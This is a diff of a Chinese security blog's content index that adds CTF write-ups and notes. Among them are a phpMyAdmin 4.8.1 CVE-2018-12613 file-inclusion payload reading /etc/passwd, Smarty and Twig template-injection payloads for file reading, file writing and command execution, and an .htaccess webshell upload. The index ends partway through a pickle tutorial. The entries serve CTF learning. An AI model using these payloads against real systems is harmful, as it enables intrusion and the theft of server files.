-<p>第一次碰到这种题目，有点懵逼，就去百度了一下 <code>phpmyadmin 4.8 漏洞</code> 发现了存在 <code>CVE-2018-12613</code> 远程文件包含漏洞。将找到的payload（这里要注意系统是Windows还是Linux）尝试一下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phpmyadmin/?target=db_datadict.php%253f/../../../../../../../../etc/passwd # linux payload</span><br></pre></td></tr></table></figure>
-<p>结果：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324205506.png" /></p>
-<p>发现确实存在漏洞，那么将 <code>/etc/passwd</code> 改为我们想要的文件路径即可。问题是这里我们不知道 flag 在哪，一般在根目录或者网站目录，这里只知道根目录，所以就尝试以下根目录，即</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phpmyadmin/?target=db_datadict.php%253f/../../../../../../../../flag</span><br></pre></td></tr></table></figure>
-<p>得到 flag</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324205738.png" /></p>
+<p>打开环境可以很明显看到，这就是一个文件上传的题目。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321194818.png" /></p>
+<h1 id="过滤测试">过滤测试</h1>
+<h2 id="过滤类型测试">过滤类型测试</h2>
+<p>随便上传一个图片 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321195148.png" /></p>
+<p>根据提示 <code>上传类型</code> 推测应该需要修改 <code>Content-Type</code>，尝试 <code>image/gif</code> 和 <code>imag/jpeg</code> 后，发现后者是可以的。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321195315.png" /></p>
+<h2 id="过滤后缀测试">过滤后缀测试</h2>
+<p>将后缀修改为 <code>php</code> ，上传 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321195444.png" /></p>
+<p>经过多次尝试，发现我无法绕过这个过滤。此时思考，是否可以不用特定后缀又可以上传文件，想到了 <code>.htaccess</code> 。尝试一下发现成功！ <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321195835.png" /></p>
+<p>记录一下地址 <code>/var/www/html/upload/0ac6e66ec314df83922a1ebbbdf6e358/.htaccess</code>。之后，只要上传一个文件名为 <code>shell.jpg</code> 的木马即可。</p>
+<h2 id="文件内容过滤">文件内容过滤</h2>
+<p>写入一句话木马，然后上传，果不其然被过滤了。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321200100.png" /></p>
+<p>换一种写法发现还是不行 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321200308.png" /></p>
+<p>猜测过滤的应该是开头的那个 <code>php</code> 。因此，换一种写法，成功绕过。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321200502.png" /></p>
+<p>记录上传地址：<code>/var/www/html/upload/0ac6e66ec314df83922a1ebbbdf6e358/shell.jpg</code></p>
+<h1 id="蚁剑连接get-flag">蚁剑连接get flag</h1>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321200538.png" /></p>
+<p>flag在根目录 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321200555.png" /></p>
+<p>成功。</p>
 <h1 id="总结">总结</h1>
-<p>本题考的是平常的总结，以及对信息的敏感度。看到一些版本信息要想到是否存在该版本特有的信息，并且即使搜索。平常遇到这类的问题也要多积累。</p>
+<ol type="1">
+<li>要熟悉常用的上传类型，题目中大多考察的是图片，因此要熟记：<code>image/jpeg</code>、<code>image/png</code>、<code>image/gif</code>；</li>
+<li>当脚本后缀被过滤之后，并且无法绕过时，需要想到 <code>.htaccess</code>；</li>
+<li>文件内容的过滤，需要知道多种木马的写法。</li>
+</ol>
 ]]></content>
       <categories>
         <category>CTF</category>
       </categories>
       <tags>
-        <tag>phpmyadmin 漏洞</tag>
-        <tag>CVE-2018-12613</tag>
+        <tag>文件上传</tag>
       </tags>
   </entry>
   <entry>
@@ -689,6 +647,103 @@
       </tags>
   </entry>
   <entry>
+    <title>GWCTF 2019 我有一个数据库</title>
+    <url>/2022/03/24/GWCTF%202019%20%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
+    <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
+<span id="more"></span>
+<h1 id="题目信息">题目信息</h1>
+<p>进入环境之后，不论是数据包还是页面源码，什么信息都没有，只有如下看不懂的字</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324204732.png" /></p>
+<p>因此，决定扫描目录，结果如下：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324204816.png" /></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324204824.png" /></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324204843.png" /></p>
+<p>将所有都访问一次，发现只有 <code>/phpmyadmin</code> 有用，界面如下：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324204938.png" /></p>
+<h1 id="解题">解题</h1>
+<p>通过该页面发现：</p>
+<ol type="1">
+<li><p>phpmyadmin 版本为 4.8.1</p></li>
+<li><p>服务器用的是 apache</p></li>
+<li><p>数据库是 mysql</p></li>
+<li><p>PHP版本信息为 7.2.24-0ubuntu0.18.04.1</p></li>
+<li><p>系统为 Ubuntu</p></li>
+</ol>
+<p>第一次碰到这种题目，有点懵逼，就去百度了一下 <code>phpmyadmin 4.8 漏洞</code> 发现了存在 <code>CVE-2018-12613</code> 远程文件包含漏洞。将找到的payload（这里要注意系统是Windows还是Linux）尝试一下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phpmyadmin/?target=db_datadict.php%253f/../../../../../../../../etc/passwd # linux payload</span><br></pre></td></tr></table></figure>
+<p>结果：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324205506.png" /></p>
+<p>发现确实存在漏洞，那么将 <code>/etc/passwd</code> 改为我们想要的文件路径即可。问题是这里我们不知道 flag 在哪，一般在根目录或者网站目录，这里只知道根目录，所以就尝试以下根目录，即</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phpmyadmin/?target=db_datadict.php%253f/../../../../../../../../flag</span><br></pre></td></tr></table></figure>
+<p>得到 flag</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324205738.png" /></p>
+<h1 id="总结">总结</h1>
+<p>本题考的是平常的总结，以及对信息的敏感度。看到一些版本信息要想到是否存在该版本特有的信息，并且即使搜索。平常遇到这类的问题也要多积累。</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>phpmyadmin 漏洞</tag>
+        <tag>CVE-2018-12613</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Smarty模板注入</title>
+    <url>/2022/04/05/Smarty%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<p>记录一下关于Smarty模板注入的知识点以及相关的payload。</p>
+<span id="more"></span>
+<h1 id="漏洞确认">漏洞确认</h1>
+<p>先通过决策树，判断是否属于smarty：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220404145633.png" /></p>
+<p>然后通过<code>&#123;$smarty.version&#125;</code>判断smarty版本。</p>
+<h1 id="漏洞利用">漏洞利用</h1>
+<h2 id="常规利用">常规利用</h2>
+<p>Smarty支持使用<code>&#123;php&#125;&#123;/php&#125;</code>标签来执行被包裹其中的php指令，最常规的思路自然是先测试该标签。 在Smarty3的官方手册里有以下描述：</p>
+<blockquote>
+<p>Smarty已经废弃{php}标签，强烈建议不要使用。在Smarty 3.1，{php}仅在SmartyBC中可用。</p>
+</blockquote>
+<h2 id="literal-标签">{literal} 标签</h2>
+<p>官方手册这样描述这个标签：</p>
+<blockquote>
+<p><strong><code>&#123;literal&#125;</code>可以让一个模板区域的字符原样输出。</strong> 这经常用于保护页面上的Javascript或css样式表，避免因为Smarty的定界符而错被解析。</p>
+</blockquote>
+<p>因此可以利用如下payload实现PHP代码执行：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;phpinfo();&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>需要注意的是：<strong>从PHP7开始，这种方法就失效了</strong>。</p>
+<h2 id="静态方法">静态方法</h2>
+<p><code>$smarty</code>内置变量可用于访问各种环境变量，比如我们使用 <code>self</code> 得到 smarty 这个类以后我们就去找 smarty 给我们的的方法。</p>
+<p>smarty类中的<code>getStreamVariable()</code> 方法可以获取传入变量的流</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getStreamVariable</span>(<span class="params"><span class="variable">$variable</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="variable">$_result</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable">$fp</span> = fopen(<span class="variable">$variable</span>, <span class="string">&#x27;r+&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$fp</span>) &#123;</span><br><span class="line">            <span class="keyword">while</span> (!feof(<span class="variable">$fp</span>) &amp;&amp; (<span class="variable">$current_line</span> = fgets(<span class="variable">$fp</span>)) !== <span class="literal">false</span>) &#123;</span><br><span class="line">                <span class="variable">$_result</span> .= <span class="variable">$current_line</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            fclose(<span class="variable">$fp</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$_result</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$smarty</span> = <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;smarty) ? <span class="keyword">$this</span>-&gt;smarty : <span class="keyword">$this</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$smarty</span>-&gt;error_unassigned) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> SmartyException(<span class="string">&#x27;Undefined stream variable &quot;&#x27;</span> . <span class="variable">$variable</span> . <span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>因此我们可以用这个方法读文件，payload:<br />
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;<span class="built_in">self</span>::getStreamVariable(<span class="string">&quot;file:///etc/passwd&quot;</span>)&#125;</span><br></pre></td></tr></table></figure></p>
+<p>然而，这个payload有时候会触发报错，因为这是<strong>旧版本的SSTI的利用方式</strong>，并不适用于新版本的。<strong>而且在3.1.30的Smarty版本中官方已经把该静态方法删除</strong>。</p>
+<p><strong>利用 Smarty_Internal_Write_File 类的writeFile方法来写shell也由于同样的原因无法使用。</strong></p>
+<p>同样：<code>Smarty_Internal_Write_File</code> 这个类中有一个<code>writeFile</code>方法</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Smarty_Internal_Write_File</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Writes file in a safe way to disk * * <span class="doctag">@param</span>  string $_filepath complete filepath * <span class="doctag">@param</span>  string $_contents file content * <span class="doctag">@param</span>  Smarty $smarty    smarty instance * * <span class="doctag">@throws</span> SmartyException * <span class="doctag">@return</span> boolean true */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">writeFile</span>(<span class="params"><span class="variable">$_filepath</span>, <span class="variable">$_contents</span>, Smarty <span class="variable">$smarty</span></span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">        <span class="variable">$_error_reporting</span> = error_reporting();</span><br><span class="line">        error_reporting(<span class="variable">$_error_reporting</span> &amp; ~E_NOTICE &amp; ~E_WARNING);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$smarty</span>-&gt;_file_perms !== <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="variable">$old_umask</span> = umask(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$_dirpath</span> = dirname(<span class="variable">$_filepath</span>);</span><br><span class="line">        <span class="comment">// if subdirs, create dir structure</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$_dirpath</span> !== <span class="string">&#x27;.&#x27;</span> &amp;&amp; !file_exists(<span class="variable">$_dirpath</span>)) &#123;</span><br><span class="line">            mkdir(<span class="variable">$_dirpath</span>, <span class="variable">$smarty</span>-&gt;_dir_perms === <span class="literal">null</span> ? <span class="number">0777</span> : <span class="variable">$smarty</span>-&gt;_dir_perms, <span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// write to tmp file, then move to overt file lock race condition</span></span><br><span class="line">        <span class="variable">$_tmp_file</span> = <span class="variable">$_dirpath</span> . DS . str_replace(<span class="keyword">array</span>(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;,&#x27;</span>), <span class="string">&#x27;_&#x27;</span>, uniqid(<span class="string">&#x27;wrt&#x27;</span>, <span class="literal">true</span>));</span><br><span class="line">        <span class="keyword">if</span> (!file_put_contents(<span class="variable">$_tmp_file</span>, <span class="variable">$_contents</span>)) &#123;</span><br><span class="line">            error_reporting(<span class="variable">$_error_reporting</span>);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> SmartyException(<span class="string">&quot;unable to write file <span class="subst">&#123;$_tmp_file&#125;</span>&quot;</span>);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Windows&#x27; rename() fails if the destination exists, * Linux&#x27; rename() properly handles the overwrite. * Simply unlink()ing a file might cause other processes * currently reading that file to fail, but linux&#x27; rename() * seems to be smart enough to handle that for us. */</span></span><br><span class="line">        <span class="keyword">if</span> (Smarty::<span class="variable">$_IS_WINDOWS</span>) &#123;</span><br><span class="line">            <span class="comment">// remove original file</span></span><br><span class="line">            <span class="keyword">if</span> (is_file(<span class="variable">$_filepath</span>)) &#123;</span><br><span class="line">                @unlink(<span class="variable">$_filepath</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// rename tmp file</span></span><br><span class="line">            <span class="variable">$success</span> = @rename(<span class="variable">$_tmp_file</span>, <span class="variable">$_filepath</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// rename tmp file</span></span><br><span class="line">            <span class="variable">$success</span> = @rename(<span class="variable">$_tmp_file</span>, <span class="variable">$_filepath</span>);</span><br><span class="line">            <span class="keyword">if</span> (!<span class="variable">$success</span>) &#123;</span><br><span class="line">                <span class="comment">// remove original file</span></span><br><span class="line">                <span class="keyword">if</span> (is_file(<span class="variable">$_filepath</span>)) &#123;</span><br><span class="line">                    @unlink(<span class="variable">$_filepath</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// rename tmp file</span></span><br><span class="line">                <span class="variable">$success</span> = @rename(<span class="variable">$_tmp_file</span>, <span class="variable">$_filepath</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$success</span>) &#123;</span><br><span class="line">            error_reporting(<span class="variable">$_error_reporting</span>);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> SmartyException(<span class="string">&quot;unable to write file <span class="subst">&#123;$_filepath&#125;</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$smarty</span>-&gt;_file_perms !== <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// set file permissions</span></span><br><span class="line">            chmod(<span class="variable">$_filepath</span>, <span class="variable">$smarty</span>-&gt;_file_perms);</span><br><span class="line">            umask(<span class="variable">$old_umask</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        error_reporting(<span class="variable">$_error_reporting</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到 writeFile 函数第三个参数一个 Smarty 类型，后来找到了 self::clearConfig()，函数原型：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">clearConfig</span>(<span class="params"><span class="variable">$varname</span> = <span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> Smarty_Internal_Extension_Config::clearConfig(<span class="keyword">$this</span>, <span class="variable">$varname</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>构造的payload如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;Smarty_Internal_Write_File::writeFile(<span class="variable">$SCRIPT_NAME</span>,<span class="string">&quot;&lt;?php phpinfo();?&gt;&quot;</span>,<span class="built_in">self</span>::clearConfig())&#125;</span><br></pre></td></tr></table></figure></p>
+<h2 id="if标签">{if}标签</h2>
+<p>官方文档中看到这样的描述：</p>
+<p>Smarty的{if}条件判断和PHP的if非常相似，只是增加了一些特性。每个{if}必须有一个配对的{/if}，也可以使用{else} 和 {elseif}，全部的PHP条件表达式和函数都可以在if内使用，如<code>||*, or, &amp;&amp;, and, is_array(),</code> 等等，如：<code>&#123;if is_array($array)&#125;&#123;/if&#125;*</code></p>
+<p>payload如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">格式：&#123;<span class="keyword">if</span> PHP代码&#125;&#123;/<span class="keyword">if</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>. &#123;<span class="keyword">if</span> phpinfo()&#125;&#123;/<span class="keyword">if</span>&#125; <span class="comment"># 执行phpinfo()</span></span><br><span class="line"></span><br><span class="line"><span class="number">2</span>. &#123;<span class="keyword">if</span> system(<span class="string">&#x27;ls&#x27;</span>)&#125;&#123;/<span class="keyword">if</span>&#125; <span class="comment"># 调用system执行系统命令ls</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="命令执行">命令执行</h2>
+<p>php中的命令执行： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">exec — 执行一个外部程序  </span><br><span class="line">passthru — 执行外部程序并且显示原始输出  </span><br><span class="line">proc_close — 关闭由 proc_open 打开的进程并且返回进程退出码  </span><br><span class="line">proc_open — 执行一个命令，并且打开用来输入/输出的文件指针。  </span><br><span class="line">popen — 打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生。  </span><br><span class="line">proc_terminate — 杀死由 proc_open 打开的进程  </span><br><span class="line">shell_exec — 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。  </span><br><span class="line">system — 执行外部程序，并且显示输出</span><br><span class="line">scandir 列出指定路径中的文件和目录  </span><br><span class="line"><span class="keyword">eval</span> — 把字符串作为PHP代码执行  </span><br><span class="line">assert --函数直接将传入的参数当成PHP代码执行</span><br></pre></td></tr></table></figure></p>
+<p>linux查看文件的命令：<br />
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat, tac, more, less, head, tail, nl, paste, od, bzmore, bzless</span><br></pre></td></tr></table></figure></p>
+<p>php文件读取函数：<br />
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">print_r() fread() fgets() var_dump()</span><br></pre></td></tr></table></figure></p>
+<p>例题：<a href="https://hdfzzf.icu/2022/04/05/bugku_聪明的PHP/">bugku_聪明的PHP</a></p>
+]]></content>
+      <categories>
+        <category>SSTI</category>
+      </categories>
+      <tags>
+        <tag>Smarty</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Twig模板注入</title>
     <url>/2022/04/05/Twig%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</url>
     <content><![CDATA[<p>记录一下关于Twig模板注入的知识点以及相关的payload。</p>
@@ -704,7 +759,7 @@
 <p>因此，构造如下payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;id&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure></p>
 <p>这句话就类似在Linux系统中的shell直接执行命令<code>id</code>。</p>
 <p>在Twig 2.x/3.x中<code>_self</code>的作用发生变化，此payload不能继续使用。</p>
-<p>例题：[[BJDCTF20Cookie is so stable]]</p>
+<p>例题：<a href="https://hdfzzf.icu/2022/04/05/BJDCTF20%20Cookie%20is%20so%20stable/">BJDCTF20Cookie is so stable</a></p>
 <h1 id="twig-2.x-3.x">Twig 2.x / 3.x</h1>
 <h2 id="map过滤器">map过滤器</h2>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[<span class="string">&quot;id&quot;</span>]|map(<span class="string">&quot;system&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;[<span class="string">&quot;id&quot;</span>]|map(<span class="string">&quot;passthru&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;[<span class="string">&quot;id&quot;</span>]|map(<span class="string">&quot;exec&quot;</span>)&#125;&#125;    <span class="comment">// 无回显</span></span><br></pre></td></tr></table></figure>
@@ -726,6 +781,115 @@
       </categories>
       <tags>
         <tag>Twig</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>bugku_聪明的php</title>
+    <url>/2022/04/05/bugku_%E8%81%AA%E6%98%8E%E7%9A%84php/</url>
+    <content><![CDATA[<p>题目地址：https://ctf.bugku.com/challenges/detail/id/198.html</p>
+<span id="more"></span>
+<h1 id="题目信息">题目信息</h1>
+<p>进入环境获得一句话提示： &gt;pass a parameter and maybe the flag file's filename is random :&gt;</p>
+<p>随便给一个参数，得到如下界面：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405113111.png" /></p>
+<p>将代码复制出来： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;./libs/Smarty.class.php&#x27;</span>);  </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;pass a parameter and maybe the flag file&#x27;s filename is random :&gt;&quot;</span>;  </span><br><span class="line"><span class="variable">$smarty</span> = <span class="keyword">new</span> Smarty();  </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>)&#123; highlight_file(<span class="string">&#x27;index.php&#x27;</span>);  </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">AS</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)  </span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="keyword">print</span> <span class="variable">$key</span>.<span class="string">&quot;\n&quot;</span>;  </span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag|\/flag/i&quot;</span>, <span class="variable">$value</span>))&#123; <span class="variable">$smarty</span>-&gt;display(<span class="string">&#x27;./template.html&#x27;</span>);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        &#125;<span class="keyword">elseif</span>(preg_match(<span class="string">&quot;/system|readfile|gz|exec|eval|cat|assert|file|fgets/i&quot;</span>, <span class="variable">$value</span>))&#123; <span class="variable">$smarty</span>-&gt;display(<span class="string">&#x27;./template.html&#x27;</span>);              </span><br><span class="line">              </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123; <span class="variable">$smarty</span>-&gt;display(<span class="string">&quot;eval:&quot;</span>.<span class="variable">$value</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">          </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>发现关键词<code>smarty</code>。 # 解题 本题已知模板引擎为SSTI，那么接下来就应该判断以下版本 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;$smarty.version&#125;</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405113325.png" /></p>
+<p>版本为3.1。</p>
+<p>那么<a href="https://hdfzzf.icu/2022/04/05/Smarty模板注入/">Smarty模板注入</a>中的常规利用、{literal}标签、静态方法都无法使用，那只能使用{if}标签和命令执行。</p>
+<h2 id="命令执行">命令执行</h2>
+<p>查找flag的路径： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?a=&#123;passthru(<span class="string">&#x27;ls /&#x27;</span>)&#125;</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405113844.png" /></p>
+<p>根据最开始的提示，flag的文件名是随机取得，因此判断红框就是flag文件。</p>
+<p>接着需要读取flag（注意cat被过滤了）： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?a=&#123;passthru(<span class="string">&#x27;tac /_9764&#x27;</span>)&#125;</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405114505.png" /></p>
+<h2 id="if标签">{if}标签</h2>
+<p>其实和命令执行没什么不同。payload如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. ?a=&#123;<span class="keyword">if</span> passthru(<span class="string">&#x27;ls /&#x27;</span>)&#125;&#123;/<span class="keyword">if</span>&#125;</span><br><span class="line"><span class="number">2</span>. ?a=&#123;<span class="keyword">if</span> passthru(<span class="string">&#x27;tac /_9764&#x27;</span>)&#125;&#123;/<span class="keyword">if</span>&#125;</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405114645.png" /></p>
+]]></content>
+      <categories>
+        <category>SSTI</category>
+      </categories>
+      <tags>
+        <tag>Smarty</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>pickle 库</title>
+    <url>/2022/01/30/pickle%20%E5%BA%93/</url>
+    <content><![CDATA[<p>pickle 库的简单使用。</p>
+<span id="more"></span>
+<h1 id="前言">前言</h1>
+<p>官方文档：<a href="https://docs.python.org/zh-cn/3/library/pickle.html">pickle</a></p>
+<h1 id="介绍">介绍</h1>
+<p>模块 pickle 实现了对一个 Python 对象结构的二进制序列化和反序列化。</p>
+<h1 id="常用方法">常用方法</h1>
+<p>主要由两类接口，即序列化和反序列化。</p>
+<p>其中序列化包括： 1. dump() 2. dumps()</p>
+<p>反序列化包括： 1. load() 2. loads()</p>
+<p><strong>序列化后的对象是 bytes 类型的，反序列后的对象同样也是 bytes 类型的，也就是二进制文件。</strong></p>
+<h2 id="dump">dump</h2>
+<p>语法： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pickle.dump(obj, file, protocol=<span class="literal">None</span>, *, fiximports=<span class="literal">True</span>, buffer_callback=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<p>将对象 obj 序列化以后的对象写入已打开的 file object file。</p>
+</blockquote>
+<p>参数： 主要参数就是前两个： - obj：要序列化的对象 - file：序列化完之后的对象需要写入到 file 中。</p>
+<p>例子： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line">tar = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;lihua&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">30</span>&#125;  </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;pickle使用的文件/after.p&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">    pickle.dump(tar, f)</span><br></pre></td></tr></table></figure></p>
+<h2 id="dumps">dumps</h2>
+<p>语法： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pickle.dump(obj, protocol=<span class="literal">None</span>, *, fiximports=<span class="literal">True</span>, buffer_callback=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure></p>
+<p>参数： - obj：要序列化的对象 - 少了 file</p>
+<ul>
+<li>返回值 <strong>直接返回序列化后的二进制对象。（这是与 dump 最大的区别）</strong></li>
+</ul>
+<p>例子： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line">tar = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;lihua&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">30</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(pickle.dumps(tar))</span><br></pre></td></tr></table></figure></p>
+<p>结果： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;\x80\x04\x95\x1c\x00\x00\x00\x00\x00\x00\x00&#125;\x94(\x8c\x04name\x94\x8c\x05lihua\x94\x8c\x03age\x94K\x1eu.&#x27;</span><br></pre></td></tr></table></figure></p>
+<h2 id="load">load</h2>
+<p>语法： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pickle.load(file, *, protocol=<span class="literal">None</span>, fiximports=<span class="literal">True</span>, encoding=<span class="string">&#x27;ASCII&#x27;</span>, errors=<span class="string">&#x27;strict&#x27;</span>, buffers=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure></p>
